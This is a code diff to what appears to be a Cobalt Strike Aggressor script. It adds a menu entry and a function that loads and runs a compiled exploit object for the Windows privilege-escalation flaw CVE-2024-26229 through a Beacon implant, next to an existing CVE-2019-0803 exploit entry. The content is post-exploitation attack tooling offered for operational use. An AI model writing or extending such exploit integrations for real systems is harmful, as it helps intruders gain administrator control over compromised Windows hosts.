@@ -147,6 +147,15 @@ sub cve_2019_0803{
     bupload!($bid, $fname);
     bshell!($bid,"0803.exe cmd  $+ \"$fname\"");
 }
+
+sub cve_2024_26229{
+    btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via cve-2024-26229");
+    # read in the right BOF file
+    $handle = openf(script_resource("bof/CVE-2024-26229-bof.o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+    beacon_inline_execute($bid, $data, "go", 0);
+}
 #append menus
 
 
@@ -228,6 +237,14 @@ sub cve_2019_0803{
             $Dialog = dialog("CVE-2019-0803",%(bid => $bid),&cve_2019_0803);
             dialog_description($Dialog, "The elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory, aka 'Win32k Elevation of Privilege Vulnerability'.");
             drow_listener($Dialog, "listener", "Listener: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+        }
+
+        item "CVE-2024-26229"{
+            $bid = $1['@'];
+            $Dialog = dialog("CVE-2024-26229",%(bid => $bid),&cve_2024_26229);
+            dialog_description($Dialog, "CVE-2024-26229 LPE.");
             dbutton_action($Dialog, "Exploit");
             dialog_show($Dialog);
         }
